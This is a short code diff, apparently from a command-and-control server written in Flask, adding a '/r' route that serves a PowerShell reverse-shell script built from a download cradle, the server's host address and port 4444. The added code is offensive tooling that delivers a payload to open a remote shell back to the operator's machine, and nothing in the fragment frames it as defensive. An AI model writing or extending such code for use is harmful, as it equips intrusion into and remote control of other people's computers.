@@ -238,3 +238,14 @@ def debug():
     else:
         response = Response("not found")
     return response
+
+
+@app.route('/r', methods=["GET"])
+def reverse_shell():
+    """Spawn a reverse shell"""
+    context = {
+        "dl_cradle": stager_str(need_proxy=False).replace('$K', '$R'),
+        "IP": args.URI_HOST,
+        "PORT": "4444",
+    }
+    return render_template("reverse-shell.ps1", **context)
